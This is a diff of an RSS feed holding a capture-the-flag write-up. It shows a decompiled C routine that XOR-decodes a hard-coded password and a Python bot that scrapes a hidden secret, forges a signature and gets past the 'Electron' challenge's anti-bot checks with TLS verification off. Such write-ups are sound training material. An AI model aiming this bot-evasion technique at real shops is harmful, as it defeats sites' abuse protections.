+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>To generate the static string I used this C program, mainly copy-pasted from the decompiler:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">calcPass&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>input1,&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>input2)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pbVar1;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> cVar2;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uint outLen;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>in2len;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>res;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uint index;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uint uVar3;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> in2len &lt;span style="color:#f92672">=&lt;/span> input1;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cVar2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>in2len;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> in2len &lt;span style="color:#f92672">=&lt;/span> in2len &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">while&lt;/span> (cVar2 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> outLen &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)in2len &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)(input1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> in2len &lt;span style="color:#f92672">=&lt;/span> input2;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cVar2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>in2len;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> in2len &lt;span style="color:#f92672">=&lt;/span> in2len &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">while&lt;/span> (cVar2 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)malloc(outLen &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> index &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (outLen &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uVar3 &lt;span style="color:#f92672">=&lt;/span> index &lt;span style="color:#f92672">%&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)((&lt;span style="color:#66d9ef">int&lt;/span>)in2len &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)(input2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pbVar1 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(res &lt;span style="color:#f92672">+&lt;/span> index);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> index &lt;span style="color:#f92672">=&lt;/span> index &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>pbVar1 &lt;span style="color:#f92672">=&lt;/span> input2[uVar3] &lt;span style="color:#f92672">^&lt;/span> pbVar1[(&lt;span style="color:#66d9ef">int&lt;/span>)input1 &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)res];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">while&lt;/span> (index &lt;span style="color:#f92672">&amp;lt;&lt;/span> outLen);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res[outLen] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> res;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> res;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> in1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;h&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">FgR&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Tg[VaRUcZ__n^F`GRNx]d&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">]STA_R]Sp]Wz`_^Dj&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">F&lt;/span>&lt;span style="color:#ae81ff">\x7f&lt;/span>&lt;span style="color:#e6db74">^DwVVGe[VaRUSZG{&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">[Tt&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">V@&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> in2 [] &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#ae81ff">0x31&lt;/span>, &lt;span style="color:#ae81ff">0x33&lt;/span>, &lt;span style="color:#ae81ff">0x33&lt;/span>, &lt;span style="color:#ae81ff">0x33&lt;/span>, &lt;span style="color:#ae81ff">0x33&lt;/span>, &lt;span style="color:#ae81ff">0x37&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>};
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> pass &lt;span style="color:#f92672">=&lt;/span> calcPass(in1, (&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>in2);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;%s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, pass);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="electron">Electron&lt;/h1>
 &lt;blockquote>
 &lt;p>Shoperfect now has a new bug bounty program to help mitigate bot activity on their website.
 You need to buy premium items from Shoperfect, but you need to be fast.&lt;/p>
@@ -368,34 +393,44 @@ You need to buy premium items from Shoperfect, but you need to be fast.&lt;/p>
 &lt;p>The challenge required to write a simple bot program to get the flag very quickly.&lt;/p>
 &lt;p>&lt;strong>Solution&lt;/strong>&lt;/p>
 &lt;p>With a bit of reverse engineering of the &lt;code>merge&lt;/code> function and the rude fingerprinting code, we can write such a script to get the flag:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> re
-&lt;span style="color:#f92672">import&lt;/span> requests
-&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">merge&lt;/span>(in1, in2):
-out &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
-&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(in1)):
-out &lt;span style="color:#f92672">+=&lt;/span> in1[i] &lt;span style="color:#f92672">+&lt;/span> in2[i &lt;span style="color:#f92672">%&lt;/span> min(len(in1), len(in2))]
-&lt;span style="color:#66d9ef">return&lt;/span> out
-resp &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;https://electron.chal.intentsummit.org/start?id=1&amp;#39;&lt;/span>, verify&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
-product_id &lt;span style="color:#f92672">=&lt;/span> int(re&lt;span style="color:#f92672">.&lt;/span>findall(&lt;span style="color:#e6db74">r&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/get_limited_item/(\d+)&amp;#39;&lt;/span>, resp&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#ae81ff">0&lt;/span>])
-&lt;span style="color:#66d9ef">if&lt;/span> product_id &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
-product_id &lt;span style="color:#f92672">=&lt;/span> product_id &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
-&lt;span style="color:#66d9ef">else&lt;/span>:
-product_id &lt;span style="color:#f92672">=&lt;/span> product_id &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
-print(&lt;span style="color:#e6db74">&amp;#39;PRODUCT&amp;#39;&lt;/span>, product_id)
-resp &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;https://electron.chal.intentsummit.org/get_limited_item/&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>product_id&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, verify&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
-&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Sorry, bot are not allowed on our website&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> resp&lt;span style="color:#f92672">.&lt;/span>text:
-print(&lt;span style="color:#e6db74">&amp;#39;RETRY&amp;#39;&lt;/span>)
-exit(&lt;span style="color:#ae81ff">1&lt;/span>)
-secret &lt;span style="color:#f92672">=&lt;/span> re&lt;span style="color:#f92672">.&lt;/span>findall(&lt;span style="color:#e6db74">r&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;lt;input type=&amp;#34;hidden&amp;#34; value=&amp;#34;(.*?)&amp;#34; style=&amp;#34;visibility: hidden&amp;#34; id=&amp;#34;secret&amp;#34; name=&amp;#34;secret&amp;#34;&amp;gt;&amp;#39;&lt;/span>, resp&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#ae81ff">0&lt;/span>]
-print(&lt;span style="color:#e6db74">&amp;#39;SECRET&amp;#39;&lt;/span>, secret)
-sig &lt;span style="color:#f92672">=&lt;/span> merge(&lt;span style="color:#e6db74">&amp;#39;343d9040a671c45832ee5381860e2996&amp;#39;&lt;/span>, secret)
-print(&lt;span style="color:#e6db74">&amp;#39;SIG&amp;#39;&lt;/span>, sig)
-resp &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>post(&lt;span style="color:#e6db74">&amp;#39;https://electron.chal.intentsummit.org/send_offer&amp;#39;&lt;/span>, data&lt;span style="color:#f92672">=&lt;/span>{
-&lt;span style="color:#e6db74">&amp;#39;Do you like spicy potatoes ?&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;yes&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;Do you like sausages ?&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;yes&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;Are you sure ?&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;yes&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;secret&amp;#39;&lt;/span>: secret,
-&lt;span style="color:#e6db74">&amp;#39;sig&amp;#39;&lt;/span>: sig,
-}, verify&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
-print(resp&lt;span style="color:#f92672">.&lt;/span>status_code, resp&lt;span style="color:#f92672">.&lt;/span>text)
-&lt;/code>&lt;/pre>&lt;/div></content></item></channel></rss>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> re
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">merge&lt;/span>(in1, in2):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> out &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(in1)):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> out &lt;span style="color:#f92672">+=&lt;/span> in1[i] &lt;span style="color:#f92672">+&lt;/span> in2[i &lt;span style="color:#f92672">%&lt;/span> min(len(in1), len(in2))]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> out
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>resp &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;https://electron.chal.intentsummit.org/start?id=1&amp;#39;&lt;/span>, verify&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>product_id &lt;span style="color:#f92672">=&lt;/span> int(re&lt;span style="color:#f92672">.&lt;/span>findall(&lt;span style="color:#e6db74">r&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/get_limited_item/(\d+)&amp;#39;&lt;/span>, resp&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#ae81ff">0&lt;/span>])
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> product_id &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> product_id &lt;span style="color:#f92672">=&lt;/span> product_id &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> product_id &lt;span style="color:#f92672">=&lt;/span> product_id &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;PRODUCT&amp;#39;&lt;/span>, product_id)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>resp &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;https://electron.chal.intentsummit.org/get_limited_item/&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>product_id&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, verify&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Sorry, bot are not allowed on our website&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> resp&lt;span style="color:#f92672">.&lt;/span>text:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;RETRY&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">1&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>secret &lt;span style="color:#f92672">=&lt;/span> re&lt;span style="color:#f92672">.&lt;/span>findall(&lt;span style="color:#e6db74">r&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;lt;input type=&amp;#34;hidden&amp;#34; value=&amp;#34;(.*?)&amp;#34; style=&amp;#34;visibility: hidden&amp;#34; id=&amp;#34;secret&amp;#34; name=&amp;#34;secret&amp;#34;&amp;gt;&amp;#39;&lt;/span>, resp&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#ae81ff">0&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;SECRET&amp;#39;&lt;/span>, secret)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sig &lt;span style="color:#f92672">=&lt;/span> merge(&lt;span style="color:#e6db74">&amp;#39;343d9040a671c45832ee5381860e2996&amp;#39;&lt;/span>, secret)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;SIG&amp;#39;&lt;/span>, sig)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>resp &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>post(&lt;span style="color:#e6db74">&amp;#39;https://electron.chal.intentsummit.org/send_offer&amp;#39;&lt;/span>, data&lt;span style="color:#f92672">=&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;Do you like spicy potatoes ?&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;yes&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;Do you like sausages ?&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;yes&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;Are you sure ?&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;yes&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;secret&amp;#39;&lt;/span>: secret,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;sig&amp;#39;&lt;/span>: sig,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}, verify&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(resp&lt;span style="color:#f92672">.&lt;/span>status_code, resp&lt;span style="color:#f92672">.&lt;/span>text)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></content></item></channel></rss>
